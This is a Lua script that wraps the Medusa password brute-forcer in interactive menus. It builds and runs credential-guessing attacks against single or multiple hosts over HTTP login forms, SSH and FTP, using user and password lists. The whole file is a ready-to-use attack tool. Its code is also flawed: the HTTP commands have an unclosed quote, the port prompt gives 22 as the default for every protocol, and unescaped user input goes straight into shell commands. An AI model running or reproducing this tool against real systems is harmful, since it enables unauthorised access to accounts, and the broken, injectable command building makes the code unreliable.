-- medusa brute force tool for http


function medusa_http()
    print([[
[1] Brute a single target
[2] Brute multiple targets
    ]])
    io.write("Enter value: ")
    local target_choice = io.read()
    if target_choice == "1" then
        io.write("Enter target IP: ")
        target = io.read()
    elseif target_choice == "2" then
        io.write("Enter path to file list of target IP: ")
        file_target = io.read()
    else
        print("Invalid input value..!!")
        os.exit(0)
    end
    print("\n")
    print([[
[1] Use a users list
[2] Specify target username            
        ]])
    io.write("Enter value: ")
    local user_value = io.read()
    if user_value == "1" then
        io.write("Enter path to users list: ")
        file_user = io.read()
    elseif user_value == "2" then
        io.write("Enter target username: ")
        username = io.read()
    else
        print("Invalid input value")
        os.exit(0)
    end
    print("\n")
    print([[
[1] Use a password list
[2] Specify a password
    ]])
    io.write("Enter value: ")
    pass_value = io.read()
    if pass_value == "1" then
        io.write("Enter path to passwordlist: ")
        file_pass = io.read()
    elseif pass_value == "2" then
        io.write("Enter password text: ")
        password = io.read()
    else 
        print("Invalid input value..!!")
        os.exit(0)
    end
    io.write("Enter port number (If you have none specific, Enter 22 as the default port): ")
    local port = io.read()
    io.write("Enter the login page for credential capture: ")
    local login = io.read()
    io.write("Enter login error for medusa to check out for: ")
    local error_value = io.read()
    if target_choice == "1" and (user_value == "1") and (pass_value == "1") then
        os.execute('medusa -h '..target..' -U '..file_user..' -P '..file_pass..' -M http -m FORM:"/'..login..':username=^USER^&password=^PASS^" -m ERROR:"'..error_value..'-n '..port..' -t 10')
    elseif target_choice == "2" and (user_value == "1") and (pass_value == "1") then
        os.execute('medusa -H '..file_target..' -U '..file_user..' -P '..file_pass..' -M http -m FORM:"/'..login..':username=^USER^&password=^PASS^" -m ERROR:"'..error_value..'-n '..port..' -t 10')
    elseif target_choice == "2" and (user_value == "2") and (pass_value == "1") then
        os.execute('medusa -H '..file_target..' -u '..username..' -P '..file_pass..' -M http -m FORM:"/'..login..':username=^USER^&password=^PASS^" -m ERROR:"'..error_value..'-n '..port..' -t 10')
    elseif target_choice == "2" and (user_value == "2") and (pass_value == "2") then
        os.execute('medusa -H '..file_target..' -u '..username..' -p '..password..' -M http -m FORM:"/'..login..':username=^USER^&password=^PASS^" -m ERROR:"'..error_value..'-n '..port..' -t 10')
    elseif target_choice == "1" and (user_value == "2") and (pass_value == "2") then
        os.execute('medusa -h '..target..' -u '..username..' -p '..password..' -M http -m FORM:"/'..login..':username=^USER^&password=^PASS^" -m ERROR:"'..error_value..'-n '..port..' -t 10')
    elseif target_choice == "1" and (user_value == "1") and (pass_value == "2") then
        os.execute('medusa -h '..target..' -U '..file_user..' -p '..password..' -M http -m FORM:"/'..login..':username=^USER^&password=^PASS^" -m ERROR:"'..error_value..'-n '..port..' -t 10')
    else 
        print("Error executing command based on inputs..!!")
        os.exit(0)
    end
end


-- medusa brute force tool for ssh


function medusa_ssh()
    print([[
[1] Brute a single target
[2] Brute multiple targets
    ]])
    io.write("Enter value: ")
    local target_choice = io.read()
    if target_choice == "1" then
        io.write("Enter target IP: ")
        target = io.read()
    elseif target_choice == "2" then
        io.write("Enter path to file list of target IP: ")
        file_target = io.read()
    else
        print("Invalid input value..!!")
        os.exit(0)
    end
    print("\n")
    print([[
[1] Use a users list
[2] Specify target username            
        ]])
    io.write("Enter value: ")
    local user_value = io.read()
    if user_value == "1" then
        io.write("Enter path to users list: ")
        file_user = io.read()
    elseif user_value == "2" then
        io.write("Enter target username: ")
        username = io.read()
    else
        print("Invalid input value")
        os.exit(0)
    end
    print("\n")
    print([[
[1] Use a password list
[2] Specify a password
    ]])
    io.write("Enter value: ")
    pass_value = io.read()
    if pass_value == "1" then
        io.write("Enter path to passwordlist: ")
        file_pass = io.read()
    elseif pass_value == "2" then
        io.write("Enter password text: ")
        password = io.read()
    else 
        print("Invalid input value..!!")
        os.exit(0)
    end
    io.write("Enter port number (If you have none specific, Enter 22 as the default port): ")
    local port = io.read()
    if target_choice == "1" and (user_value == "1") and (pass_value == "1") then
        os.execute("medusa -h "..target.." -U "..file_user.." -P "..file_pass.." -M ssh -n "..port.." -t 10")
    elseif target_choice == "2" and (user_value == "1") and (pass_value == "1") then
        os.execute("medusa -H "..file_target.." -U "..file_user.." -P "..file_pass.." -M ssh -n "..port.." -t 10")
    elseif target_choice == "2" and (user_value == "2") and (pass_value == "1") then
        os.execute("medusa -H "..file_target.." -u "..username.." -P "..file_pass.." -M ssh -n "..port.." -t 10")
    elseif target_choice == "2" and (user_value == "2") and (pass_value == "2") then
        os.execute("medusa -H "..file_target.." -u "..username.." -p "..password.." -M ssh -n "..port.." -t 10")
    elseif target_choice == "1" and (user_value == "2") and (pass_value == "2") then
        os.execute("medusa -h "..target.." -u "..username.." -p "..password.." -M ssh -n "..port.." -t 10")
    elseif target_choice == "1" and (user_value == "1") and (pass_value == "2") then
        os.execute("medusa -h "..target.." -U "..file_user.." -p "..password.." -M ssh -n "..port.." -t 10")
    else 
        print("Error executing command based on inputs..!!")
        os.exit(0)
    end
        
end


-- medusa brute force tool for ftp


function medusa_ftp()
    print([[
[1] Brute a single target
[2] Brute multiple targets
    ]])
    io.write("Enter value: ")
    local target_choice = io.read()
    if target_choice == "1" then
        io.write("Enter target IP: ")
        target = io.read()
    elseif target_choice == "2" then
        io.write("Enter path to file list of target IP: ")
        file_target = io.read()
    else
        print("Invalid input value..!!")
        os.exit(0)
    end
    print("\n")
    print([[
[1] Use a users list
[2] Specify target username            
        ]])
    io.write("Enter value: ")
    local user_value = io.read()
    if user_value == "1" then
        io.write("Enter path to users list: ")
        file_user = io.read()
    elseif user_value == "2" then
        io.write("Enter target username: ")
        username = io.read()
    else
        print("Invalid input value")
        os.exit(0)
    end
    print("\n")
    print([[
[1] Use a password list
[2] Specify a password
    ]])
    io.write("Enter value: ")
    pass_value = io.read()
    if pass_value == "1" then
        io.write("Enter path to passwordlist: ")
        file_pass = io.read()
    elseif pass_value == "2" then
        io.write("Enter password text: ")
        password = io.read()
    else 
        print("Invalid input value..!!")
        os.exit(0)
    end
    io.write("Enter port number (If you have none specific, Enter 22 as the default port): ")
    local port = io.read()
    if target_choice == "1" and (user_value == "1") and (pass_value == "1") then
        os.execute("medusa -h "..target.." -U "..file_user.." -P "..file_pass.." -M ftp -n "..port.." -t 10")
    elseif target_choice == "2" and (user_value == "1") and (pass_value == "1") then
        os.execute("medusa -H "..file_target.." -U "..file_user.." -P "..file_pass.." -M ftp -n "..port.." -t 10")
    elseif target_choice == "2" and (user_value == "2") and (pass_value == "1") then
        os.execute("medusa -H "..file_target.." -u "..username.." -P "..file_pass.." -M ftp -n "..port.." -t 10")
    elseif target_choice == "2" and (user_value == "2") and (pass_value == "2") then
        os.execute("medusa -H "..file_target.." -u "..username.." -p "..password.." -M ftp -n "..port.." -t 10")
    elseif target_choice == "1" and (user_value == "2") and (pass_value == "2") then
        os.execute("medusa -h "..target.." -u "..username.." -p "..password.." -M ftp -n "..port.." -t 10")
    elseif target_choice == "1" and (user_value == "1") and (pass_value == "2") then
        os.execute("medusa -h "..target.." -U "..file_user.." -p "..password.." -M ftp -n "..port.." -t 10")
    else 
        print("Error executing command based on inputs..!!")
        os.exit(0)
    end
end